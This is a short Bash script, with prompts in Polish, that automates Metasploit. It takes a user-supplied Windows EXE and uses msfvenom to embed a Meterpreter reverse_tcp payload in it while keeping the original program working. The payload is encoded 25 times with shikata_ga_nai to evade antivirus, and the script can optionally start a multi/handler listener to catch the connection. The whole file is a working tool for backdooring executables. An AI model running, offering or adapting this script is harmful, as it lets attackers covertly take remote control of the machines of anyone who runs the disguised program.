#! /bin/bash
# METASPLOIT AUTOMATIC SCRIPT INJECT PAYLOAD TO EXE FILE
echo "
   ____________  _______ ______  _____  __  __ _____ ____ _______  __ 
  / __/ ___/ _ \/  _/ _ /_  __/ / _ \ \/ / / //_/ _ /_  /<  / __ \/ / 
 _\ \/ /__/ , __/ // ___// /   / _  |\  / / ,< / // // /_/ / /_/ / /__
/___/\___/_/|_/___/_/   /_/   /____/ /_/ /_/|_|\___//___/_/\____/____/

"
echo "Startuję skrypt ..."
echo "Podaj lokalizację pliku exe do przebudowania: "
read LOKALIZACJA
echo "Przenoszę plik do /home/kali/Desktop/ ..."
mv $LOKALIZACJA /home/kali/Desktop/
cd /home/kali/Desktop
echo "Podaj nazwe pliku do przebudowania: "
read NAZWA
echo "Podaj ip ładunku: "
read IP
echo "Podaj port ładunku: "
read PORT
echo "Podaj nazwe ładunku po kompilacji: "
read LADUNEK
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -f exe -e x86/shikata_ga_nai -i 25 -k -x /home/kali/Desktop/$NAZWA.exe LHOST=$IP LPORT=$PORT >$LADUNEK.exe
echo "Czy mam uruchomić pakiet metasploit ? (Y/N)"
read ODPOWIEDZ
if [ $ODPOWIEDZ == "Y" ]
then
  echo "Uruchamiam skrypt... "
  sleep 3
  msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp'
else
  echo "Kończę działanie skryptu ..."
fi

